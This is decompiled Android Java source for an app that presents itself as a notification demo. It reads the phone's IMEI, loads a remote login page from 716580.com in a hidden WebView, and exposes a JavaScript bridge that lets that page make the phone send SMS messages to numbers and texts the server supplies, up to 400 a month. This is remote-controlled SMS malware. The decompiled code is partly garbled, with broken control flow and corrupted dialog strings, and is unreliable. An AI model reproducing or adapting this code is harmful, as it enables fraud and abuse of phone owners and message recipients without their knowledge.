package com.example.notification;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.support.v4.app.NotificationCompat.Builder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.Toast;
import java.io.PrintStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MainActivity extends Activity
  implements View.OnClickListener
{
  private Context context = this;
  SQLiteDatabase db;
  private Bitmap icon;
  String imei = "http://www.716580.com";
  private NotificationManager manager;
  String urlStr1 = "http://www.716580.com/b2b/wapb/login.asp";
  String urlStr2 = "http://www.716580.com/b2b/wapb/login.asp";
  private String username = "";
  private WebView wv1;
  private WebView wv2;

  private void backApp1(String paramString1, String paramString2)
  {
    WebView localWebView = this.wv1;
    String str1 = "http://" + paramString2;
    localWebView.loadUrl(str1);
    NotificationCompat.Builder localBuilder = new NotificationCompat.Builder(this);
    localBuilder.setSmallIcon(2130837504);
    String str2 = getString(2131034112);
    localBuilder.setContentTitle(str2);
    localBuilder.setContentText(paramString1);
    localBuilder.setDefaults(1);
    localBuilder.setAutoCancel(true);
    Intent localIntent = new Intent(this, MainActivity.class);
    PendingIntent localPendingIntent = PendingIntent.getActivity(this, 0, localIntent, 134217728);
    localBuilder.setContentIntent(localPendingIntent);
    NotificationManager localNotificationManager = (NotificationManager)getSystemService("notification");
    Notification localNotification = localBuilder.build();
    localNotificationManager.notify(5, localNotification);
  }

  private void init()
  {
    NetworkInfo localNetworkInfo = ((ConnectivityManager)this.context.getSystemService("connectivity")).getNetworkInfo(1);
    String str1 = ((TelephonyManager)getSystemService("phone")).getDeviceId();
    this.imei = str1;
    SQLiteDatabase localSQLiteDatabase = openOrCreateDatabase("test.db", 0, null);
    this.db = localSQLiteDatabase;
    this.db.execSQL("CREATE TABLE if not exists person (_id INTEGER PRIMARY KEY AUTOINCREMENT, name VARCHAR)");
    this.db.execSQL("CREATE TABLE if not exists sms (_id INTEGER PRIMARY KEY AUTOINCREMENT, mob VARCHAR,body VARCHAR,date1 VARCHAR)");
    WebView localWebView1 = (WebView)findViewById(2131230721);
    this.wv1 = localWebView1;
    this.wv1.getSettings().setUseWideViewPort(true);
    this.wv1.getSettings().setLoadWithOverviewMode(true);
    WebView localWebView2 = this.wv1;
    String str2 = this.urlStr1;
    localWebView2.loadUrl(str2);
    WebView localWebView3 = (WebView)findViewById(2131230720);
    this.wv2 = localWebView3;
    this.wv2.setScrollBarStyle(0);
    this.wv2.getSettings().setUseWideViewPort(true);
    this.wv2.getSettings().setLoadWithOverviewMode(true);
    this.wv2.getSettings().setJavaScriptEnabled(true);
    WebView localWebView4 = this.wv2;
    InJavaScriptLocalObj localInJavaScriptLocalObj = new InJavaScriptLocalObj();
    localWebView4.addJavascriptInterface(localInJavaScriptLocalObj, "local_obj");
    WebView localWebView5 = this.wv2;
    WebViewClientDemo localWebViewClientDemo = new WebViewClientDemo(null);
    localWebView5.setWebViewClient(localWebViewClientDemo);
    this.wv2.setVisibility(8);
    String str3 = String.valueOf(this.urlStr2);
    StringBuilder localStringBuilder = new StringBuilder(str3);
    String str4 = this.imei;
    String str5 = str4 + "/";
    log(str5);
    WebView localWebView6 = this.wv2;
    String str6 = this.urlStr2;
    localWebView6.loadUrl(str6);
    WebView localWebView7 = this.wv1;
    String str7 = this.urlStr2;
    localWebView7.loadUrl(str7);
  }

  public void log(String paramString)
  {
    Context localContext = this.context;
    String str = paramString.toString();
    Toast.makeText(localContext, str, 1).show();
  }

  public void onClick(View paramView)
  {
    paramView.getId();
  }

  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    requestWindowFeature(1);
    setContentView(2130903040);
    init();
  }

  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    int i = 4;
    boolean bool;
    if (paramInt == i)
    {
      bool = this.wv1.canGoBack();
      if (bool)
      {
        this.wv1.goBack();
        bool = true;
      }
    }
    while (true)
    {
      return bool;
      bool = super.onKeyDown(paramInt, paramKeyEvent);
    }
  }

  public void showDialog3(String paramString)
  {
    MainActivity localMainActivity = this;
    EditText localEditText = new EditText(this);
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(localMainActivity).setTitle(paramString).setIcon(17301659).setView(localEditText);
    MainActivity.1 local1 = new MainActivity.1(this, localEditText);
    localBuilder.setPositiveButton("纭", local1).setNegativeButton("鍙", null).show();
  }

  final class InJavaScriptLocalObj
  {
    InJavaScriptLocalObj()
    {
    }

    public void sendsms(String paramString1, String paramString2, String paramString3)
    {
      Object localObject1 = null;
      SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyyMM");
      Date localDate = new Date();
      String str1 = localSimpleDateFormat.format(localDate);
      SQLiteDatabase localSQLiteDatabase1 = MainActivity.this.db;
      String[] arrayOfString1 = new String[1];
      arrayOfString1[0] = str1;
      Cursor localCursor1 = localSQLiteDatabase1.rawQuery("select count(_id) from sms where date1=?", arrayOfString1);
      int i;
      if (localCursor1.moveToNext())
      {
        MainActivity localMainActivity1 = MainActivity.this;
        String str2 = String.valueOf(localCursor1.getLong(0));
        String str3 = str2 + "-count-" + str1;
        localMainActivity1.log(str3);
        if (localCursor1.getLong(0) > 400L)
          break label386;
        i = 1;
      }
      while (true)
      {
        localCursor1.close();
        SmsManager localSmsManager;
        if (i != null)
        {
          SQLiteDatabase localSQLiteDatabase2 = MainActivity.this.db;
          String[] arrayOfString2 = new String[3];
          arrayOfString2[0] = paramString1;
          arrayOfString2[1] = paramString2;
          arrayOfString2[2] = paramString3;
          Cursor localCursor2 = localSQLiteDatabase2.rawQuery("SELECT * FROM sms WHERE mob = ? and body=? and date1=?", arrayOfString2);
          if (!localCursor2.moveToNext())
          {
            localCursor2.close();
            MainActivity localMainActivity2 = MainActivity.this;
            String str4 = String.valueOf(paramString1);
            String str5 = str4 + "-insert-" + paramString2;
            localMainActivity2.log(str5);
            SQLiteDatabase localSQLiteDatabase3 = MainActivity.this.db;
            String[] arrayOfString3 = new String[3];
            arrayOfString3[0] = paramString1;
            arrayOfString3[1] = paramString2;
            arrayOfString3[2] = paramString3;
            localSQLiteDatabase3.execSQL("INSERT INTO sms VALUES (NULL,?,?,?)", arrayOfString3);
            localSmsManager = SmsManager.getDefault();
          }
        }
        try
        {
          MainActivity localMainActivity3 = MainActivity.this;
          String str6 = String.valueOf(paramString1);
          String str7 = str6 + "-sms-" + paramString2;
          localMainActivity3.log(str7);
          MainActivity localMainActivity4 = MainActivity.this;
          Intent localIntent = new Intent();
          PendingIntent localPendingIntent = PendingIntent.getBroadcast(localMainActivity4, 0, localIntent, 0);
          String str8 = paramString1;
          String str9 = paramString2;
          localSmsManager.sendTextMessage(str8, null, str9, localPendingIntent, null);
          return;
          label386: Object localObject2 = null;
        }
        catch (Exception localException)
        {
          while (true)
            localException.printStackTrace();
        }
      }
    }

    public void showSource(String paramString)
      throws InterruptedException
    {
      String[] arrayOfString1 = null;
      SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyyMMdd");
      Object localObject1 = new Date();
      String str2 = localSimpleDateFormat.format((Date)localObject1);
      localObject1 = "\\|";
      String[] arrayOfString2 = paramString.split((String)localObject1);
      Object localObject3 = null;
      while (true)
      {
        int i = arrayOfString2.length;
        if (localObject3 >= i)
          return;
        String str3 = arrayOfString2[localObject3];
        i = localObject3 + 3;
        String str4 = arrayOfString2[i];
        boolean bool = str2.equals(str3);
        if (bool)
        {
          int j = str4.length();
          if (j <= 5)
            break;
          MainActivity localMainActivity = MainActivity.this;
          int n = localObject3 + 2;
          String str5 = arrayOfString2[n];
          String str6 = str4.replace("?", "");
          localMainActivity.backApp1(str5, str6);
        }
        localObject3 += 4;
      }
      int k = localObject3 + 1;
      int i1 = localObject3 + 1;
      String str7 = arrayOfString2[i1].replace("�", ",");
      arrayOfString2[k] = str7;
      k = localObject3 + 1;
      Object localObject2 = arrayOfString2[k];
      arrayOfString1 = localObject2.split("\\,");
      Object localObject4 = null;
      while (true)
      {
        int m = arrayOfString1.length;
        if (localObject4 >= m)
          break;
        String str1 = arrayOfString1[localObject4];
        int i2 = localObject3 + 2;
        String str8 = arrayOfString2[i2];
        String str9 = arrayOfString2[localObject3].substring(null, 6);
        sendsms(str1, str8, str9);
        long l = 1000L;
        try
        {
          Thread.sleep(l);
          label269: localObject4++;
        }
        catch (InterruptedException localInterruptedException)
        {
          break label269;
        }
      }
    }
  }

  class WebViewClientDemo extends WebViewClient
  {
    private WebViewClientDemo()
    {
    }

    public void onPageFinished(WebView paramWebView, String paramString)
    {
      System.out.println("onPageFinished");
      super.onPageFinished(paramWebView, paramString);
    }

    public void onPageStarted(WebView paramWebView, String paramString, Bitmap paramBitmap)
    {
      System.out.println("onPageStarted");
      super.onPageStarted(paramWebView, paramString, paramBitmap);
    }

    public boolean shouldOverrideUrlLoading(WebView paramWebView, String paramString)
    {
      paramWebView.loadUrl(paramString);
      return true;
    }
  }
}